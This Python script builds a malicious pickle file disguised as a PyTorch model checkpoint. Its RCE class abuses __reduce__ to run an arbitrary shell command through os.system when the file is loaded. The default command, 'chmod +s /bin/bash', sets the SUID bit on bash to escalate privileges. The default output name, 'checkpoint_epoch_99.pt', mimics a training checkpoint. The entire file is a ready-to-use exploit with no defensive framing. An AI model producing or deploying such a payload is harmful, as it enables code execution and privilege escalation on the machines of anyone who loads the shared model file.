import argparse, os, pickle, zipfile

class RCE:
   def __init__(self, cmd):
       self.cmd = cmd
   def __reduce__(self):
       return (os.system, (self.cmd,))

def build(cmd, out):
   payload = pickle.dumps({"model": RCE(cmd)}, protocol=2)
   with zipfile.ZipFile(out, "w", zipfile.ZIP_STORED) as z:
       z.writestr("archive/data.pkl", payload)
       z.writestr("archive/version", "3\n")
   print(f"[+] wrote {out} ({os.path.getsize(out)} bytes)")

p = argparse.ArgumentParser()
p.add_argument("-c", "--command", default="chmod +s /bin/bash")
p.add_argument("-o", "--output", default="checkpoint_epoch_99.pt")
a = p.parse_args()
build(a.command, a.output)
